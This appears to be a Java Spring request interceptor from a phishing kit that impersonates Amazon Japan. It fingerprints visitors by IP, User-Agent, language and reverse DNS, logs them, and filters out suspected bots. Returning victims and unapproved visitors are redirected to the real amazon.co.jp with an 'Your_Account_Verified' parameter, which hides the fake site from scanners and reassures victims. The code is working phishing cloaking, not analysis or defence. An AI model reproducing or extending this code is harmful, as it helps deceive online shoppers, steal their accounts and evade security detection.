package com.kidd.amazon.interceptor;

import cn.hutool.core.date.DateUtil;
import com.kidd.amazon.common.IpUtils;
import com.kidd.amazon.service.AuthUserService;
import com.kidd.amazon.service.CacheService;
import com.kidd.amazon.task.AsyncTask;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.web.servlet.HandlerInterceptor;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.LinkedHashMap;
import java.util.Map;

@Service
public class SessionInfoInterceptor implements HandlerInterceptor {

    @Autowired
    private AsyncTask asyncTask;

    @Autowired
    private AuthUserService authUserService;

    @Autowired
    private CacheService cacheService;

    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response, Object handler) throws Exception {
        System.out.println(request.getRequestURI());
        //已经访问过的用户、byebye
        Boolean isBot = true;
        Cookie[] cookies = request.getCookies();
        if (null != cookies) {
            for (Cookie cookie : cookies) {
                if (cookie.getName().equalsIgnoreCase("kiddIp")) {
                    response.sendRedirect("https://amazon.co.jp/?Your_Account_Verified");
                    return false;
                }
            }
        }
        //ip
        String ip = IpUtils.getIpAddress(request);
        Integer botStatus =(Integer) cacheService.getCommonCache(ip+"checkBot");
        if (null != botStatus && botStatus ==1) {
            isBot = false;
        }

        String ul = request.getHeader("Accept-Language");
        String uaStr = request.getHeader("User-Agent");
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String dateTime = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (LinkedHashMap<String, String>) session.getAttribute("userInfo");
        if(null == userInfoMap){
            userInfoMap = new LinkedHashMap<>();
        }
        userInfoMap.put("UserAgent", uaStr);
        userInfoMap.put("Ip", IpUtils.getIpAddress(request));
        //userInfoMap.put("DateTime", dateTime);
        //userInfoMap.put("Al", ul);
        session.setAttribute("userInfo",userInfoMap);
        Boolean authBool =  authUserService.auth(request);
        userInfoMap = (LinkedHashMap<String, String>) session.getAttribute("userInfo");
        String ipInfo = userInfoMap.get("ipinfo");
        String rdns = userInfoMap.get("rdns");
        asyncTask.asyncWriteAccessLog(request,ip,ipInfo,rdns,dateTime,authBool,uaStr,ul,isBot);
        if(authBool && !isBot){
            return true;
        }
        response.sendRedirect("https://amazon.co.jp/?Your_Account_Verified");
        return false;
    }
}
